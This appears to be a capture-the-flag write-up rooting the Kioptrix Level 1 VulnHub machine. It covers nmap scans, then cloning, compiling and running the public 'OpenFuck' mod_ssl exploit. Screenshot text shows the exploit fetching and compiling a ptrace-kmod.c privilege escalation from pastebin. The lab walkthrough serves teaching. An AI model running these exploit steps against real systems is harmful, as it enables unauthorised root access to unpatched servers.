<html lang="en-US">
	<head>
		<title>Kioptrix 1</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="created" content="2020-11-02T13:40:00.0000000" />
	</head>
	<body data-absolute-enabled="true" style="font-family:Calibri;font-size:11pt">
		<div style="position:absolute;left:48px;top:115px;width:722px">
			<p style="margin-top:0pt;margin-bottom:0pt">Vulnhub link: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22">https://www.vulnhub.com/entry/kioptrix-level-1-1,22</a></p>
			<p style="margin-top:0pt;margin-bottom:0pt">Torrent Download: <a href="https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar.torrent">https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar.torrent</a></p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">Install and mount kiopreix VM in virtualbox</p>
			<br />
			<img alt="Nevv Settings &#10;S Gene &#10;Name: &#10;Discard &#10;KJoptrixI &#10;Operating System: Linux 2.6 3. x 4. x (32-bit) &#10;Syste m &#10;Base Memor &#10;Soot Order: &#10;Acceleration: &#10;Display &#10;Video Memory: &#10;512 Ma &#10;Hard Disk &#10;VT-x/AMD-V, Nested Paging, KW Paravirtualizabon &#10;Graphics Controller: &#10;Remote Desktop Server: &#10;Recor ding: &#10;Sto rage &#10;Controller: SATA &#10;VMSVGA &#10;Disabled &#10;Disabled &#10;IDE Primary Master: KJoptxLeveI I. vmdk Clormal, 3.00 GE) &#10;Host Driver: Windows Dir ectSound &#10;controller: ICH Acg7 &#10;Network &#10;Adapter I: PCnet-PCIII OAT NeWNork, 'Nat'eWNork') &#10;Shared folders &#10;Description " width="420" height="585" src="images/qqthppfzpq.png" data-src-type="image/png" />
			<br />
			<br />
			<img alt="Kioptrixl [Running] - Oracle VM Virtua180x &#10;File Machine View Input Devices Help &#10;elcome to Kioptrix Level 1 Penetration and assessment Environment &#10;--The object of this game: &#10;_ acquire '&quot;root&quot; access to this machine. &#10;here are many ways this can be done, try and find more then one way to &#10;appreciate this exercise. &#10;DISCLAIMER: Kioptrix is not resposible for any damage or instability &#10;caused by running, installing or using this UM image. &#10;se at your own risk. &#10;WARNING: This is a vulnerable system, DO NOT run this OS in a production &#10;environment. Nor should you give this system access to the outside world &#10;(the Internet &#10;or Interwebs. . ) &#10;ood luck and have fun! &#10;ioptrix login: &#10;El Right ctrl " width="722" height="474" src="images/mqqyneqtrp.png" data-src-type="image/png" />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">Once running, bootup Kali.</p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">We are not sure what IP has been assigned to the box so we need to discover it. We know based on the IP address of the Kali VM we should be on the 10.0.0.0/24 subnet.</p>
		</div>
		<div style="position:absolute;left:48px;top:1411px;width:1113px">
			<p style="margin-top:0pt;margin-bottom:0pt"><span style="font-style:italic">kali@kali:~$ ip address</span></p>
			<br />
			<img alt="File Actions Edit View Help &#10;kaliakali ip address &#10;10: &lt;LOOPBACK, UP, LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 &#10;link/loopback øø:øø:øø:øø:øø:øø brd øø:øø:øø:øø:øø:øø &#10;1/8 scope host 10 &#10;inet &#10;valid_lft forever preferred_lft forever &#10;1/128 scope host &#10;inet6 &#10;valid_lft forever preferred_lft forever &#10;etho: mtu 1500 qdisc pfifo_fast state UP group default glen 1000 &#10;link/ether brd &#10;/24 brd &#10;inet &#10;scope global dynamic noprefixroute etho &#10;10.0.0.4 &#10;10.0.0.255 &#10;valid_lft 375sec preferred_lft 375sec &#10;/64 scope link noprefixroute &#10;inet6 &#10;fe80 aoo:27ff: fe5c:6526 &#10;valid_lft forever preferred_lft forever &#10;kaliakali : — " width="828" height="320" src="images/qejguvixjd.png" data-src-type="image/png" />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">We can use Nmap to scan the local subnet and discover any hosts that are running. Since only Kali and the Kioptrix are running on this network, they should be the only two hosts up. After running the scan, nmap reports two hosts available. 10.0.0.4 is Kali. This must mean that the Vulnerable Kioptrix machine is 10.0.0.11. </p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt"><span style="font-style:italic">kali@kali:~$ nmap 10.0.0.0/24</span></p>
			<br />
			<img alt="File Actions Edit View Help &#10;kaliakali nmap 10.ø.ø.ø/24 &#10;starting Nmap 7.91 ( httos://nmao.org ) at 2020-11-02 14:28 PST &#10;Nmap scan report for 10.ø.ø.1 &#10;Host is up (0.0018s latency). &#10;Not shown: 999 closed ports &#10;PORT STATE SERVICE &#10;53/tcp open domain &#10;Nmap scan report for 10.ø.ø.4 &#10;Host is up (ø.øø22s latency). &#10;All 1000 scanned ports on 10.0.0.4 are closed &#10;Nmap scan report for 10.ø.ø.11 &#10;Host is up (0.0017s latency). &#10;Not shown: &#10;PORT &#10;22/tcp &#10;80/tcp &#10;Ill/tcp &#10;139/tcp &#10;443/tcp &#10;32768/tcp &#10;Nmap done: &#10;994 &#10;STATE &#10;open &#10;open &#10;open &#10;open &#10;open &#10;open &#10;256 &#10;closed ports &#10;SERVICE &#10;ssh &#10;http &#10;rpcbind &#10;netbios-ssn &#10;https &#10;filenet-tms &#10;IP addresses (3 hosts up) scanned in 3.25 seconds " width="591" height="449" src="images/rlbnxyjvnl.png" data-src-type="image/png" />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">The preliminary scan showed 6 ports open. We&#39;ll do a more in depth scan and confirm some of the services. Right now we aren&#39;t focused on stealth. We&#39;re trying to see how and where to make our entry point to the machine. </p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt"><span style="font-style:italic">kali@kali:~$ nmap -A -p- -T4 10.0.0.11</span></p>
			<br />
			<img alt="nmap -A -p- -T4 10.ø.ø.11 &#10;kaliakali &#10;Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-02 14:32 PST &#10;Nmap scan report for 10.ø.ø.11 &#10;Host is up (0.0017s latency). &#10;Not shown: 65529 closed ports &#10;PORT &#10;22/tcp &#10;STATE SERVICE &#10;open ssh &#10;VERSION &#10;OpenSSH 2.9p2 (protocol 1.99) &#10;ssh-hostkey: &#10;1024 (RSAI) &#10;1024 (OSA) &#10;1024 (RSA) &#10;_sshvl: Server supports SSHv1 &#10;80/tcp &#10;Apache httpd 1.3.20 ((Unix) &#10;(Red-Hat/Linux) mod_ssI/2.8.4 OpenSSL/ø.9.6b) &#10;open http &#10;http-methods : &#10;Potentially risky methods: TRACE &#10;_http-server-header: Apache/1.3.20 (Unix) &#10;(Red-Hat/Linux) mod_ss1/2.8.4 OpenSSL/ø.9.6b &#10;http-title: Test Page for the Apache Web Server on Red Hat Linux &#10;Ill/tcp &#10;2 (RPC #løøøøø) &#10;open rpcbind &#10;rpcinfo: &#10;program &#10;1 øøøøø &#10;1 øøøøø &#10;100024 &#10;100024 &#10;version &#10;port/proto service &#10;Ill/tcp &#10;rpcbind &#10;Ill/udp &#10;rpcbind &#10;32768/tcp &#10;status &#10;32768/udp &#10;status &#10;139/tcp &#10;open netbios-ssn Samba smbd (workgroup: MYGROUP) &#10;443/tcp &#10;open ssl/https Apache/l .3.20 (Unix) &#10;(Red-Hat/Linux) mod_ss1/2.8.4 OpenSSL/ø.9.6b &#10;_http-server-header: Apache/1.3.20 (Unix) &#10;(Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/ø.9.6b &#10;_http-title: 400 Bad Request &#10;ssl-cert: Subject: commonName=IocaIhost &#10;Not valid before: &#10;Not valid after: &#10;2010-09-26T09:32 : 06 &#10;_ssl-date: *4h59m59s from scanner time. &#10;sslv2: &#10;SSLv2 supported &#10;ciphers: &#10;SSL2 &#10;SSL2 &#10;SSL2 &#10;SSL2 &#10;SSL2 &#10;SSL2 &#10;SSL2 &#10;RC4 &#10;RC2 &#10;RC4 &#10;RC4 &#10;RC2 &#10;DES &#10;32768/tcp open &#10;128 WITH MD5 &#10;128 cac WITH MD5 &#10;128 EXPORT40 WITH MD5 &#10;64 WITH MD5 &#10;128 cac EXPORT40 WITH MD5 &#10;64 CBC WITH MD5 &#10;1 (RPC #100024) &#10;status &#10;Host script results: &#10;_ clock-skew: 4h59m58s &#10;_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) &#10;_smb2-time: Protocol negotiation failed (SMB2) &#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . &#10;Nmap done: 1 IP address (1 host up) scanned in 71.46 seconds " width="1090" height="819" src="images/plywaqqqdn.png" data-src-type="image/png" />
			<br />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">This report takes much longer, but provides much more granular detail. Here we can see that this machine is running SSH (port 20), an Apache Web Services (ports 80 and 443), RPC Service (ports 111 and 32768), and Samba (port 139). We can also tell that this is a Red Hat linux box. </p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">From the list of open ports I know that Samba is likely going to be where our vulnerabilities exist. This is a very vulnerable service and almost always should be disabled and should never be open on an internet facing network. Since there is a webserver running, we should check that out first. </p>
			<br />
			<br />
			<img alt="Test Page for the Apache Web Server on Red Hat Linux - Mozilla Firefox &#10;Test Page for the Apache We X &#10;Kali Linux - Kali Training &#10;Kali Tools &#10;https:// &#10;10.0.0.11 &#10;•b Kali Docs @phpMyAdmin &#10;Kali Forums &#10;NetHunter &#10;n Offensive Security •e Exploit-DB &#10;•S, GHDB &#10;n MSFU &#10;[Free] HackTheBox Unm @ HackTheBox Unbalanc... &#10;Test Page &#10;This page is used to test the proper operation of the Apache Web server after it has been installed. If you can read this page, it means that the Apache Web server installed at this site is working properly. &#10;If you are the administrator of this website: &#10;You may now add content to this directory, and replace this page. Note that until you do so, people visiting your website will see this page, and not your content. &#10;Ifyou have upgraded from Red Hat Linux 6.2 and earlier, then you are seeing this page because the default DocumentRoot set in /etc/httpd/conf/httpd.conf has changed. Any subdirectories which existed under /home/httpd should now be moved to /var/ww. Alternatively, the contents of /var/www can be moved to &#10;/home/httpd, and the configuration file can be updated accordingly. &#10;If you are a member of the general public: &#10;The fact that you are seeing this page indicates that the website you just visited is either experiencing problems, or is undergoing routine maintenance. &#10;Ifyou would like to let the administrators of this website know that you've seen this page instead of the page you expected, you should send them e-mail. In general, mail sent to the name &quot;webmaster&quot; and directed to the website's domain should reach the appropriate person. &#10;For example, if you experienced problems while visiting www.example.com, you should send e-mail to &quot;webmaster@example.com&quot;. &#10;The Apache documentation has been included with this distribution. &#10;For documentation and information on Red Hat Linux, please visit the Red Hat, Inc. website. The manual for Red Hat Linux is available here. &#10;You are free to use the image below on an Apache-powered Web server. Thanks for using Apache! &#10;You are free to use the image below on a Red Hat Linux-powered Web server. Thanks for using Red Hat Linux! &#10;redhat " width="1104" height="353" src="images/euflddwtoz.png" data-src-type="image/png" />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">A test page is not necessarily a vulnerability, but it does speak to the security hygiene of the box. If they left a test page open, what else might they have? Default credentials? Default file paths? </p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">I always make a habit of checking the source code for these types of machines, sometimes the creators will leave helpful hints. Unfortunately not in this case, that too was left as default. </p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">Hoping for a login page of some kind and not finding anything particularly useful, it was time to move from the website being served and look back at the webserver and continue enumerating. </p>
		</div>
		<div style="position:absolute;left:1200px;top:6009px;width:624px">
			<br />
			<br />
		</div>
		<div style="position:absolute;left:48px;top:3937px;width:1104px">
			<p style="margin-top:0pt;margin-bottom:0pt">Apache 1.3.20 is a significantly outdated software version, the current version is somewhere around 2.4.46 (as or November 2020). This may be a good place to explore further. As I continued to enumerate I found the OpenSSL 2.8.4 is not only outdated, but has a known vulnerability which allows for Remote Code Execution by way of a buffer overflow. The exploit is outdated unfortunately, but some nice soul has brought it up to date and created a github for it.</p>
			<p style="margin-top:0pt;margin-bottom:0pt"> </p>
			<p style="margin-top:0pt;margin-bottom:0pt"><a href="https://github.com/heltonWernik/OpenLuck">https://github.com/heltonWernik/OpenLuck</a></p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">Installing the script is straightforward thanks to the person that updated it. Follow the instructions from the git hub or look at the screenshots below.</p>
			<p style="margin-top:0pt;margin-bottom:0pt">￼When I install or download new repos from github I almost always change directories to be in the /opt/ folder and start the clone there. </p>
			<br />
			<img alt="cd /opt &#10;kaliakali :/opt$ sudo git clone https://github.com/he1tonWernik/OpenFuck.git &#10;Cloning into 'OpenFuck' &#10;remote: Enumerating objects: 26, done. &#10;remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26 &#10;Unpacking objects: 100% (26/26), 14.12 KiB | 249.00 KiB/s, done. &#10;kaliakali :/opt$ sudo apt-get install Iibssl-dev &#10;Reading package lists &#10;Done &#10;Building dependency tree &#10;Reading state information &#10;Done &#10;libssl-dev is already the newest version (1.1.1g-1). &#10;The following packages were automatically installed and are no longer required: &#10;libcdi018 libcfitsi08 libcharls2 libgtksourceview2.ø-ø libgtksourceview2.ø-common Iibjsoncppl libmpdec2 Iibpgm-5.2-ø libpoppler82 Iibprotobuf22 &#10;libproxychains3 libsnmp35 libsrtl-gnutls libtsk13 libx264-155 libx264-159 libyara3 openjdk-8-jre proxychains python-cairo python-chardet python-dbus &#10;python-enchant python-gi python-gobject-2 python-gtk2 python-gtksourceview2 python-numpy python-pkg-resources python3-flask-restless python3-grequests &#10;python3-mimeparse python3-mimerender &#10;Use 'sudo apt autoremove' to remove them. &#10;0 upgraded, 0 newly installed, 0 to remove and 12 not upgraded. &#10;kaliakali :/opt$ cd OpenFuck/ &#10;kaliakali :/opt/OpenFuck$ sudo gcc -o OpenFuck OpenFuck.c -Icrypto &#10;kaliakali : /opt/OpenFuck$ " width="1019" height="298.5" src="images/yrnitdnbdq.png" data-src-type="image/png" />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">Running the application without any arguments provides a list of the vulnerable systems and the associated memory block that will be used to complete the exploit. Since this is a buffer overflow exploit it&#39;s important to have the right version loaded. For this machine, we don&#39;t know exactly what OS version that is being used but we did gather it is a Red-Hat version higher than 6.2. The Nmap scan confirmed a Red-Hat OS and the website test page included verbiage indicating that the current version could have been upgraded from 6.2 or earlier. If we grep the results of the application with the apache version we know is being used and combine that with some of that information we&#39;ve gathered, we should be able to try this exploit and see if it works. </p>
			<br />
			<img alt="kaliakali : /opt/OpenFuck$ &#10;. /OpenFuck &#10;8.1 &#10;ox02 &#10;ox27 &#10;ox28 &#10;ox29 &#10;ox2a &#10;ox3a &#10;ox3b &#10;ox3f &#10;Ox6a &#10;ox6b &#10;ox7e &#10;ox86 &#10;CobaLt Sun &#10;FreeBSD ( &#10;FreeBSD ( &#10;FreeBSD ( &#10;FreeBSD ( &#10;6.0 &#10;Mandrake Linux &#10;Mandrake Linux &#10;Mandrake Linux &#10;RedHat Linux 7.2 &#10;RedHat Linux 7.2 &#10;SLackware Linux 8.0 ( &#10;SuSE Linux 7.3 (l &#10;grep apache-1.3.20 &#10;0*2.8.4) &#10;-5 . Imdk) &#10;-5 .2mdk) &#10;-3) &#10;D-16)1 &#10;Û-16)2 " width="504" height="211" src="images/mvosbftfaj.png" data-src-type="image/png" />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">For this exploit to work we should try 0x6a and 0x6b since those are the only redhat versions for apache 1.3.20. </p>
		</div>
		<div style="position:absolute;left:49px;top:4863px;width:749px">
			<p style="margin-top:0pt;margin-bottom:0pt"><span style="font-style:italic">kali@kali:/opt/OpenFuck$ ./OpenFuck 0x6a 10.0.0.11 </span></p>
			<br />
			<img alt="kaliakali :/opt/OpenFuck$ ./OpenFuck øx6a 10 .ø.ø.ll &#10;* OpenFuck v3.ø.32-root priv8 by SPABAM based on openssl-too-open * &#10;* &#10;by SPA8AM &#10;with code of Spabam - LSD-pl &#10;SolarEclipse &#10;CORE * &#10;#hackarena irc.brasnet.org &#10;TNX Xanthic USG #SilverLords #8100dBR #isotk #highsecure #uname * &#10;#10N #delirium #nitrøx #coder #root #endiabradøs #NHC #TechTeam * &#10;#pinchadoresweb HiTechHate DigitalWrapperz GAT ButtP!rateZ * &#10;Establishing SSL connection &#10;cipher: øx4043808c &#10;ciphers: &#10;Ready to send shellcode &#10;Spawning shell &#10;Good Bye! &#10;øx80fc4cø " width="572" height="273" src="images/vrxgegnhvm.png" data-src-type="image/png" />
			<br />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">Using the input 0x6a, I ran the script and it attempted to connect but it doesn&#39;t seem to respond. I tried a few times but it wasn&#39;t able to work. No shell was spawned. We should try again using 0x6b.</p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt"><span style="font-style:italic">kali@kali:/opt/OpenFuck$ ./OpenFuck 0x6b 10.0.0.11 </span></p>
			<img alt="kaliakali :/opt/OpenFuck$ ./OpenFuck øx6b 10.0.0.11 &#10;* OpenFuck v3.ø.32-root priv8 by SPABAM based on openssl-too-open * &#10;* &#10;by SPABAM &#10;with code of Spabam - LSD-pl &#10;SolarEclipse - CORE * &#10;#hackarena irc.brasnet.org &#10;TNX Xanthic USG #SilverLords #8100dBR #isotk #highsecure #uname * &#10;#10N #delirium #nitrøx #coder #root #endiabradøs #NHC #TechTeam * &#10;#pinchadoresweb HiTechHate DigitalWrapperz GAT ButtP!rateZ * &#10;Establishing SSL connection &#10;cipher: Ox4043808c &#10;ciphers: 0*8104280 &#10;Ready to send shellcode &#10;Spawning shell &#10;bash: no job control in this shell &#10;bash-2.05$ &#10;race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; &#10;https : //pastebin.com/raw/C7v25Xr9 &#10;•ptrace-kmod.c' &#10;Connecting to pastebin.com:443 &#10;connected! &#10;HTTP request sent, awaiting response &#10;200 OK &#10;Length: unspecified [text/plain] &#10;23:25:47 (491.46 KB/s) &#10;-ptrace-kmod.c' saved [4026] &#10;ptrace-kmod.c:183:1: warning: no newline at end of file &#10;Attached to 2070 &#10;Waiting for signal &#10;Signal caught &#10;Shellcode placed at øx4001189d &#10;Now wait for suid shell &#10;./p; &#10;m/raw/C7v25Xr9 &#10;491.46 KB/s &#10;-O pt " width="691" height="565" src="images/krpqhpucol.png" data-src-type="image/png" />
			<br />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">After a few unsuccessful attempts I was able to successfully spawn a shell.</p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">Surprisingly, this exploit provides full root access immediately. </p>
			<img alt="kali@kali: lopt/OpenFuck &#10;id &#10;kali@kali: &#10;uid=ø(root) gid=ø(root) groups=ø(root),1(bin),2(daemon),3(sys),4(adm),6(disk),1ø(wheeI) " width="750" height="102" src="images/omrdnmpwwh.png" data-src-type="image/png" />
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">However, escaping the TTY shell with <span style="font-style:italic">echo os.system(&#39;/bin/bash&#39;) </span>caused the shell to drop down to the apache user. A lesson that the shells gained from an exploit which was temperamental to start will not be terribly reliable. You might need to retry the exploit again if the shell drops for any reason. However, with this it&#39;s safe to say we have rooted this machine and it is now ours. We could load malicious websites, change the root password, delete system files, and more. </p>
			<br />
			<p style="margin-top:0pt;margin-bottom:0pt">To avoid this kind of exploit, updating to more recent software would eliminate the buffer exploit. The versions provided in the exploit we found were numerous, but if we can upgrade our OS or the server version either would eliminate the exploit from occurring. </p>
		</div>
		<!-- InkNode is not supported -->
		<!-- InkNode is not supported -->
		<div style="position:absolute;left:1057px;top:609px;width:624px">
			<br />
		</div>
	</body>
</html>
